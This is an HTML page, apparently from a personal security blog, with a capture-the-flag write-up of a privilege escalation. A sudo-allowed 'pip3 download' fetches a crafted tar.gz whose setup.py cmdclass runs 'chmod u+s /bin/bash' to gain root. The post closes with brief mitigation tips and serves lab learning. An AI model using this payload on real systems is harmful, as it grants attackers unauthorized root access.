@@ -1,0 +1,366 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <title>
+  Using pip to Run Malicious Commands · t0x1n
+</title>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+
+
+<meta name="author" content="Sumukh Chitloor">
+<meta name="description" content="Discover how attackers exploit pip to run malicious commands during Python package installation. Learn techniques for prevention, detection, and secure package management.">
+<meta name="keywords" content="python-security, package-exploit, pip-security, code-injection">
+
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Using pip to Run Malicious Commands">
+  <meta name="twitter:description" content="Discover how attackers exploit pip to run malicious commands during Python package installation. Learn techniques for prevention, detection, and secure package management.">
+
+<meta property="og:url" content="http://localhost:1313/posts/pip-malicious-commands/">
+  <meta property="og:site_name" content="t0x1n">
+  <meta property="og:title" content="Using pip to Run Malicious Commands">
+  <meta property="og:description" content="Discover how attackers exploit pip to run malicious commands during Python package installation. Learn techniques for prevention, detection, and secure package management.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-03-31T10:00:00+05:30">
+    <meta property="article:modified_time" content="2024-03-31T10:00:00+05:30">
+    <meta property="article:tag" content="Security">
+    <meta property="article:tag" content="Python">
+    <meta property="article:tag" content="Pip">
+    <meta property="article:tag" content="Malware">
+    <meta property="article:tag" content="Code-Execution">
+
+
+
+
+<link rel="canonical" href="http://localhost:1313/posts/pip-malicious-commands/">
+
+
+<link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="/css/coder.css" media="screen">
+
+
+
+
+
+
+  
+    
+    
+    <link rel="stylesheet" href="/css/coder-dark.css" media="screen">
+  
+
+
+
+ 
+  
+    
+    <link rel="stylesheet" href="/css/custom.css" media="screen">
+  
+
+
+
+
+
+<link rel="icon" type="image/svg+xml" href="/images/favicon.svg" sizes="any">
+<link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+
+
+
+
+
+
+</head>
+
+
+
+
+
+
+<body class="preload-transitions colorscheme-dark">
+  
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    
+    <a class="navigation-title" href="http://localhost:1313/">
+      t0x1n
+    </a>
+    
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/about/">about</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/posts/">blogs</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/research/">security research</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">
+            <a class="title-link" href="http://localhost:1313/posts/pip-malicious-commands/">
+              Using pip to Run Malicious Commands
+            </a>
+          </h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
+              <time datetime="2024-03-31T10:00:00&#43;05:30">
+                March 31, 2024
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fa-solid fa-clock" aria-hidden="true"></i>
+              3-minute read
+            </span>
+          </div>
+          
+          
+          <div class="tags">
+  <i class="fa-solid fa-tag" aria-hidden="true"></i>
+    <span class="tag">
+      <a href="/tags/security/">Security</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="/tags/python/">Python</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="/tags/pip/">Pip</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="/tags/malware/">Malware</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="/tags/code-execution/">Code-Execution</a>
+    </span></div>
+
+        </div>
+      </header>
+
+      <div class="post-content">
+        
+        <p>So, recently I was solving a hacktheboox room OnlyForYou and I got the user flag but I was struggling to get the root flag. User had this previlage to run as sudo.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/pip3 download http<span class="se">\:</span>//127.0.0.1<span class="se">\:</span>3000/*.tar.gz
+</span></span></code></pre></div><p><img src="/images/pip-malicious-blog/pip-exploit.png" alt="Sudo pip privilege showing download permission" title="Sudo permission to run pip download"></p>
+<p>But I had never seen a malicious use of pip before so I started doing research. And I founf some interesting stuffs.</p>
+<h3 id="python-package">
+  Python Package
+  <a class="heading-link" href="#python-package">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>I&rsquo;ve never built a python package myself, but there are tons of resources for that. There are different ways to go about it, and the vulnerability exists when using the setup.py variation and when the package is in a .tar.gz.</p>
+<p>In the python package, there is cmdclass in the setup, which causes pip to execute the provided command function upon both download and install of the package.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">cmdclass</span><span class="o">={</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;install&#39;</span> : RunInstallCommand,
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;egg_info&#39;</span>: RunEggInfoCommand
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>,
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">def RunCommand<span class="o">()</span>:
+</span></span><span class="line"><span class="cl">    os.system<span class="o">(</span><span class="s2">&#34;chmod u+s /bin/bash&#34;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">class RunInstallCommand<span class="o">(</span>install<span class="o">)</span>:
+</span></span><span class="line"><span class="cl">    def run<span class="o">(</span>self<span class="o">)</span>:
+</span></span><span class="line"><span class="cl">        RunCommand<span class="o">()</span>
+</span></span><span class="line"><span class="cl">        install.run<span class="o">(</span>self<span class="o">)</span>
+</span></span></code></pre></div><p>These are the main parts in the setup.py. When we build the package cmd class executes the <code>RunInstallCommand()</code>  which will run the <code>RunCommand()</code> and executes the malicious command.</p>
+<h3 id="building-the-package">
+  Building the package
+  <a class="heading-link" href="#building-the-package">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>We can go and build the package using</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python -m build
+</span></span></code></pre></div><p>After building the package <code>./dist</code> directory will be created containing the wheel and <code>tar.gz</code> files. For this demo exploit we are only interesting in the <code>tar.gz</code>. file.</p>
+<p>Suppose you recently attempted to download or install a Python package using pip. In that case, Python may have provided you with a.whl file. The reason for this is that when developers construct a Python package using, for example, the <code>pip -m build</code> command, pip automatically tries to produce a secondary.whl file in addition to the tar.gz file, which is subsequently published to the Python Package manager platform along. When a user downloads or installs this package, PIP will automatically download and install the.whl file to the user&rsquo;s machine. The way wheels function eliminates the need for setup.py execution.</p>
+<p>Even though pip prefers wheels over tar.gz files, hackers can nevertheless publish python packages without a.whl file on purpose. When a user downloads a Python package from PyPi, pip will utilize the.whl file first, but will fall back to the tar.gz file if the.whl file is not there.</p>
+<h3 id="exploitation">
+  Exploitation
+  <a class="heading-link" href="#exploitation">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p><img src="/images/pip-malicious-blog/exploitation.avif" alt="exploitation image" title="exploitation image"></p>
+<p>As I was only allowed to download anything using pip on localserver at port 3000, I added malicious .tar.gz in the repository on the local Gogs&rsquo; git server.</p>
+<p>When I downloaded that malicious package using pip download, my malicious command was executed</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo /usr/bin/pip3 download http<span class="se">\:</span>//127.0.0.1<span class="se">\:</span>3000/john/Test/src/master/this_is_fine_wuzzi-0.0.1.tar.gz
+</span></span></code></pre></div><p>after we download this,</p>
+<p><img src="/images/pip-malicious-blog/priv-esc.png" alt="prev esc image" title="priv esc image"></p>
+<p>we escalated our shell as root.</p>
+<h3 id="what-can-be-done-about-this">
+  What can be done about this?
+  <a class="heading-link" href="#what-can-be-done-about-this">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<ul>
+<li>Prefer packages with wheels, less likely to run malicious setup.py</li>
+<li>Still inspect code if from an untrusted source, wheels are not inherently safe</li>
+</ul>
+<h3 id="resources">
+  Resources
+  <a class="heading-link" href="#resources">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<ul>
+<li><a href="https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/pip-download-code-execution/#1.-create-malicious-python-package"  class="external-link" target="_blank" rel="noopener">create-malicious-python-package</a></li>
+</ul>
+
+      </div>
+
+
+      <footer>
+        
+
+<section class="see-also">
+  
+    
+    
+    
+  
+</section>
+
+
+        
+        
+        
+        
+        
+        
+        
+      </footer>
+    </article>
+
+    
+  </section>
+
+    </div>
+
+    <footer class="footer">
+  <section class="container">
+    ©
+    
+    2025
+     Sumukh Chitloor 
+    ·
+    
+    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
+    
+  </section>
+</footer>
+
+  </main>
+
+  
+
+  
+  
+  <script src="/js/coder.js"></script>
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</body>
+</html>
